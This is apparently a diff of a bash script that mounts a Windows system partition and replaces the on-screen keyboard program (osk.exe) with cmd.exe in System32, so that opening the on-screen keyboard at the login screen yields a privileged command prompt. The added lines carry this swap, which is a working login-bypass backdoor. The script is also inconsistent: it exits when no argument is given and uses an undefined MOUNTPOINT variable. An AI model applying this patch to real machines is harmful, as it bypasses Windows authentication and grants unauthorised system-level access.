@@ -23,11 +23,10 @@ fi
 
 if [[ ! -n $1 ]]; then 
     MOUNTP=/dev/sda4
+    exit 
 fi 
-
-mkdir drive 
-sudo mount $MOUNTP drive
-if [[ $(ls drive/Windows/System32 | grep cmd.exe) ]]; then 
+ 
+if [[ $(ls $MOUNTPOINT/Windows/System32 | grep cmd.exe )]]; then 
     echo "System32 detected. Continuing."
 else
     echo "System32 not found. Are you at the right directory?"
@@ -35,8 +34,9 @@ else
 fi 
 
 # Logic parts
-cd drive/Windows/System32 
+cd $MOUNTPOINT/Windows/System32 
 sudo cp -fpr osk.exe lol.exe 
-sudo cp -fpr $MYDIR/osk.exe . 
-
+sudo rm osk.exe 
+sudo cp -fpr cmd.exe osk.exe 
 echo "Patching done !"
+echo "Run patch.bat after enabling OSK !"
